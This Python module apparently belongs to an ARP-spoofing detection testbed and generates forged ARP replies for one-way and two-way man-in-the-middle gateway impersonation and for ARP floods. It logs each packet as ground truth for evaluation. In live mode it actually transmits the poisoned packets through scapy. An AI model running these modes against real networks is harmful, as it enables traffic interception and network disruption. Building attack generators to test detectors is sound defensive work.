"""ARP Spoofing Attack Module - Generates forged ARP packets for testing.
SAFETY: This module only generates packets when explicitly enabled and not in dry-run mode.
All packet transmission requires explicit confirmation and interface specification."""
from __future__ import annotations
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional, List, Callable
import time
import threading
import random
import logging

from ..models import ArpPacket, ArpOperation, AttackEvent
from ..config import get_config, SafetyConfig

logger = logging.getLogger(__name__)


class AttackMode(Enum):
    ONE_WAY = "one_way"           # Spoof single victim (gateway -> victim)
    TWO_WAY = "two_way"           # Spoof both victim and gateway (MITM)
    GATEWAY_ONLY = "gateway_only" # Only impersonate gateway
    REPLY_FLOOD = "reply_flood"   # Flood ARP replies for rate testing
    GRATUITOUS_FLOOD = "gratuitous_flood"  # Flood gratuitous ARPs


@dataclass
class AttackConfig:
    mode: AttackMode = AttackMode.ONE_WAY
    attacker_mac: str = "02:00:00:00:00:99"
    victim_ip: str = "192.168.1.10"
    victim_mac: str = "02:00:00:00:00:10"
    gateway_ip: str = "192.168.1.1"
    gateway_mac: str = "02:00:00:00:00:01"
    interval_seconds: float = 2.0
    duration_seconds: float = 60.0
    packets_per_burst: int = 1
    randomize_timing: bool = False


class AttackGenerator:
    """Generates ARP spoofing attack packets.
    
    SAFETY FEATURES:
    - Requires explicit enable() call
    - Respects dry_run mode from config
    - Rate limited by safety config
    - Logs all generated attacks for evaluation
    - Can run in simulation mode (no actual transmission)
    """
    
    def __init__(self, config: Optional[AttackConfig] = None, 
                 safety_config: Optional[SafetyConfig] = None,
                 packet_callback: Optional[Callable[[ArpPacket], None]] = None):
        self.config = config or AttackConfig()
        self.safety = safety_config or get_config().safety
        self.packet_callback = packet_callback
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._packets_sent = 0
        self._attack_events: List[AttackEvent] = []
        self._lock = threading.Lock()
        self._scapy_available = self._check_scapy()
        
    def _check_scapy(self) -> bool:
        try:
            from scapy.all import ARP, Ether, sendp
            return True
        except ImportError:
            logger.warning("Scapy not available - attack generator will run in simulation mode only")
            return False
    
    def enable(self):
        """Explicitly enable attack generation (safety requirement)."""
        if self.safety.dry_run:
            logger.info("Attack generator enabled in DRY-RUN mode (no packets transmitted)")
        else:
            if self.safety.require_explicit_interface:
                from ..config import get_config
                cfg = get_config()
                if not cfg.network.interface:
                    raise RuntimeError("Interface must be explicitly configured when not in dry-run mode")
            logger.warning("Attack generator enabled in LIVE mode - packets WILL be transmitted!")
        self._running = True
        self._stop_event.clear()
    
    def disable(self):
        """Disable attack generation."""
        self._running = False
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5.0)
        logger.info(f"Attack generator disabled. Total packets generated: {self._packets_sent}")
    
    def start(self):
        """Start attack generation in background thread."""
        if not self._running:
            raise RuntimeError("Attack generator not enabled. Call enable() first.")
        if self._thread and self._thread.is_alive():
            logger.warning("Attack generator already running")
            return
        
        self._thread = threading.Thread(target=self._run_loop, daemon=True)
        self._thread.start()
        logger.info(f"Attack generator started in {self.config.mode.value} mode")
    
    def stop(self):
        """Stop attack generation."""
        self.disable()
    
    def _run_loop(self):
        """Main attack generation loop."""
        start_time = time.time()
        end_time = start_time + self.config.duration_seconds
        
        while self._running and not self._stop_event.is_set() and time.time() < end_time:
            loop_start = time.time()
            
            try:
                packets = self._generate_attack_packets()
                for pkt in packets:
                    self._transmit_or_simulate(pkt)
                    self._record_attack_event(pkt)
                
                self._packets_sent += len(packets)
                
            except Exception as e:
                logger.error(f"Error in attack generation: {e}")
            
            # Calculate sleep time
            elapsed = time.time() - loop_start
            sleep_time = max(0, self.config.interval_seconds - elapsed)
            
            if self.config.randomize_timing:
                sleep_time *= random.uniform(0.5, 1.5)
            
            self._stop_event.wait(sleep_time)
        
        logger.info(f"Attack generation completed. Total packets: {self._packets_sent}")
    
    def _generate_attack_packets(self) -> List[ArpPacket]:
        """Generate attack packets based on configured mode."""
        now = time.time()
        packets = []
        
        for _ in range(self.config.packets_per_burst):
            if self.config.mode == AttackMode.ONE_WAY:
                # Spoof gateway to victim: tell victim that gateway MAC is attacker's MAC
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.gateway_ip,
                    sender_mac=self.config.attacker_mac,
                    target_ip=self.config.victim_ip,
                    target_mac=self.config.victim_mac
                ))
                
            elif self.config.mode == AttackMode.TWO_WAY:
                # Spoof gateway to victim
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.gateway_ip,
                    sender_mac=self.config.attacker_mac,
                    target_ip=self.config.victim_ip,
                    target_mac=self.config.victim_mac
                ))
                # Spoof victim to gateway
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.victim_ip,
                    sender_mac=self.config.attacker_mac,
                    target_ip=self.config.gateway_ip,
                    target_mac=self.config.gateway_mac
                ))
                
            elif self.config.mode == AttackMode.GATEWAY_ONLY:
                # Only impersonate gateway (broadcast)
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.gateway_ip,
                    sender_mac=self.config.attacker_mac,
                    target_ip="192.168.1.255",  # Broadcast
                    target_mac="ff:ff:ff:ff:ff:ff"
                ))
                
            elif self.config.mode == AttackMode.REPLY_FLOOD:
                # Flood replies from gateway IP with legitimate MAC (tests rate detection)
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.gateway_ip,
                    sender_mac=self.config.gateway_mac,
                    target_ip=self.config.victim_ip,
                    target_mac=self.config.victim_mac
                ))
                
            elif self.config.mode == AttackMode.GRATUITOUS_FLOOD:
                # Flood gratuitous ARPs (tests gratuitous ARP detection)
                packets.append(ArpPacket(
                    timestamp=now,
                    operation=ArpOperation.REPLY,
                    sender_ip=self.config.gateway_ip,
                    sender_mac=self.config.attacker_mac,
                    target_ip=self.config.gateway_ip,
                    target_mac=self.config.attacker_mac,
                    is_gratuitous=True
                ))
        
        return packets
    
    def _transmit_or_simulate(self, packet: ArpPacket):
        """Transmit packet or simulate based on safety config."""
        if self.safety.dry_run or not self._scapy_available:
            # Simulation mode - just log and callback
            logger.debug(f"[SIMULATION] Would send: {packet.sender_ip} ({packet.sender_mac}) -> {packet.target_ip}")
            if self.packet_callback:
                self.packet_callback(packet)
            return
        
        # Live transmission mode
        try:
            from scapy.all import ARP, Ether, sendp
            from ..config import get_config
            
            cfg = get_config()
            iface = cfg.network.interface
            
            # Build Ethernet + ARP packet
            eth = Ether(src=packet.sender_mac, dst=packet.target_mac)
            arp = ARP(
                op=2,  # Reply
                psrc=packet.sender_ip,
                hwsrc=packet.sender_mac,
                pdst=packet.target_ip,
                hwdst=packet.target_mac
            )
            
            sendp(eth/arp, iface=iface, verbose=False)
            logger.debug(f"[LIVE] Sent ARP reply: {packet.sender_ip} ({packet.sender_mac}) -> {packet.target_ip}")
            
        except Exception as e:
            logger.error(f"Failed to transmit packet: {e}")
    
    def _record_attack_event(self, packet: ArpPacket):
        """Record attack event for ground truth evaluation."""
        event = AttackEvent(
            event_id=f"atk_{len(self._attack_events):04d}",
            timestamp=packet.timestamp,
            attack_type=self.config.mode.value,
            attacker_mac=self.config.attacker_mac,
            target_ip=packet.target_ip,
            spoofed_ip=packet.sender_ip,
            spoofed_mac=packet.sender_mac,
            description=f"{self.config.mode.value}: {packet.sender_ip} claimed by {packet.sender_mac}"
        )
        with self._lock:
            self._attack_events.append(event)
    
    def get_attack_events(self) -> List[AttackEvent]:
        """Get recorded attack events for evaluation."""
        with self._lock:
            return list(self._attack_events)
    
    def get_stats(self) -> dict:
        """Get attack generator statistics."""
        return {
            'running': self._running,
            'mode': self.config.mode.value,
            'packets_sent': self._packets_sent,
            'attack_events_recorded': len(self._attack_events),
            'dry_run': self.safety.dry_run,
            'scapy_available': self._scapy_available
        }


def create_attack_scenario(scenario_name: str) -> AttackConfig:
    """Create predefined attack scenarios matching the report."""
    scenarios = {
        'gateway_impersonation': AttackConfig(
            mode=AttackMode.ONE_WAY,
            attacker_mac="02:00:00:00:00:99",
            victim_ip="192.168.1.10",
            victim_mac="02:00:00:00:00:10",
            gateway_ip="192.168.1.1",
            gateway_mac="02:00:00:00:00:01",
            interval_seconds=2.0,
            duration_seconds=30.0
        ),
        'mitm_two_way': AttackConfig(
            mode=AttackMode.TWO_WAY,
            attacker_mac="02:00:00:00:00:99",
            victim_ip="192.168.1.10",
            victim_mac="02:00:00:00:00:10",
            gateway_ip="192.168.1.1",
            gateway_mac="02:00:00:00:00:01",
            interval_seconds=1.5,
            duration_seconds=30.0
        ),
        'reply_flood': AttackConfig(
            mode=AttackMode.REPLY_FLOOD,
            attacker_mac="02:00:00:00:00:99",
            victim_ip="192.168.1.10",
            victim_mac="02:00:00:00:00:10",
            gateway_ip="192.168.1.1",
            gateway_mac="02:00:00:00:00:01",
            interval_seconds=0.1,
            duration_seconds=10.0,
            packets_per_burst=1
        ),
        'gratuitous_flood': AttackConfig(
            mode=AttackMode.GRATUITOUS_FLOOD,
            attacker_mac="02:00:00:00:00:99",
            victim_ip="192.168.1.10",
            victim_mac="02:00:00:00:00:10",
            gateway_ip="192.168.1.1",
            gateway_mac="02:00:00:00:00:01",
            interval_seconds=0.5,
            duration_seconds=15.0
        ),
    }
    
    if scenario_name not in scenarios:
        raise ValueError(f"Unknown scenario: {scenario_name}. Available: {list(scenarios.keys())}")
    
    return scenarios[scenario_name]